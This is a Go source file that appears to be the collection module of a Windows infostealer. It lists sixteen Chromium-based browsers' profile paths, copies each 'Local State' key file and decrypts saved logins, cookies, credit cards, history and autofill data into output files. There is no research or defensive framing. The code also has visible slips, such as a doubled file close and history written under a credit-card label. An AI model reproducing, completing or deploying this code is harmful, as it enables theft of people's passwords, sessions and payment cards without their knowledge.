package functions

import (
	"fmt"
	
	"os"
	"love/leno"
	
)

var (
	appData = os.Getenv("LOCALAPPDATA")
	browsers = map[string]string{
		"amigo":                appData + "\\Amigo\\User Data",
		"torch":                appData + "\\Torch\\User Data",
		"kometa":               appData + "\\Kometa\\User Data",
		"orbitum":              appData + "\\Orbitum\\User Data",
		"cent-browser":         appData + "\\CentBrowser\\User Data",
		"7star":                appData + "\\7Star\\7Star\\User Data",
		"sputnik":              appData + "\\Sputnik\\Sputnik\\User Data",
		"vivaldi":              appData + "\\Vivaldi\\User Data",
		"google-chrome-sxs":    appData + "\\Google\\Chrome SxS\\User Data",
		"google-chrome":        appData + "\\Google\\Chrome\\User Data",
		"epic-privacy-browser": appData + "\\Epic Privacy Browser\\User Data",
		"microsoft-edge":       appData + "\\Microsoft\\Edge\\User Data",
		"uran":                 appData + "\\uCozMedia\\Uran\\User Data",
		"yandex":               appData + "\\Yandex\\YandexBrowser\\User Data",
		"brave":                appData + "\\BraveSoftware\\Brave-Browser\\User Data",
		"iridium":              appData + "\\Iridium\\User Data",
	}
)


func RunCommandsAndWriteToFile(loginDataFileName, cookieDataFileName, creditCardsDataFileName, autofillDataFileName, DecryptHistoryDataName string) {
	loginDataFile, err := os.OpenFile(loginDataFileName, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Failed to open or create login data file: %v\n", err)
		return
	}
	defer loginDataFile.Close()

	cookieDataFile, err := os.OpenFile(cookieDataFileName, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Failed to open or create cookie data file: %v\n", err)
		return
	}
	defer cookieDataFile.Close()

	creditCardsDataFile, err := os.OpenFile(creditCardsDataFileName, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Failed to open or create credit cards data file: %v\n", err)
		return
	}
	defer creditCardsDataFile.Close()

	autofillDataFile, err := os.OpenFile(autofillDataFileName, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Failed to open or create autofill data file: %v\n", err)
		return
	}
	defer autofillDataFile.Close()
	DecryptHistoryData, err := os.OpenFile(DecryptHistoryDataName, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Failed to open or create history data file: %v\n", err)
		return
	}
	defer autofillDataFile.Close()
	WriteOutputToFile(DecryptHistoryData, "history data")
	WriteOutputToFile(loginDataFile, "Starting data collection...\n\n")
	WriteOutputToFile(cookieDataFile, "Cookie Data:\n\n")
	WriteOutputToFile(creditCardsDataFile, "Credit Card Data:\n\n")
	WriteOutputToFile(autofillDataFile, "Autofill Data:\n\n")

	for browser, path := range browsers {
		if !utils.CheckFileExist(path) {
			continue
		}

		profiles := GetProfiles(path)
		localStateTemp := utils.CreateTempFile("Local State Temp")
		utils.CopyFile(path+string(os.PathSeparator)+"Local State", localStateTemp)

		WriteOutputToFile(loginDataFile, "Browser: %s", browser)

		loginData := utils.DecryptLoginData(profiles, localStateTemp.Name())
		WriteDataToFile(loginDataFile, "Login Data", loginData)

		cookieData := utils.DecryptCookieData(profiles, localStateTemp.Name())
		WriteDataToFile(cookieDataFile, "Cookie Data", cookieData)

		creditCardsData := utils.DecryptCreditCardsData(profiles, localStateTemp.Name())
		WriteDataToFile(creditCardsDataFile, "Credit Cards Data", creditCardsData)
		HistoryData := utils.DecryptHistoryData(profiles)
		WriteDataToFile(DecryptHistoryData, "Credit Cards Data", HistoryData)

		autoFillData := utils.DecryptAutoFillData(profiles)
		WriteDataToFile(autofillDataFile, "Autofill Data", autoFillData)

		WriteOutputToFile(loginDataFile, "----------------------------------------------")

		utils.CloseFile(localStateTemp)
		_ = os.Remove(localStateTemp.Name())
	}
	WriteOutputToFile(DecryptHistoryData, "Data collection completed.")
	WriteOutputToFile(loginDataFile, "Data collection completed.")
	WriteOutputToFile(cookieDataFile, "Cookie Data collection completed.")
	WriteOutputToFile(creditCardsDataFile, "Credit Card Data collection completed.")
	WriteOutputToFile(autofillDataFile, "Autofill Data collection completed.")
}
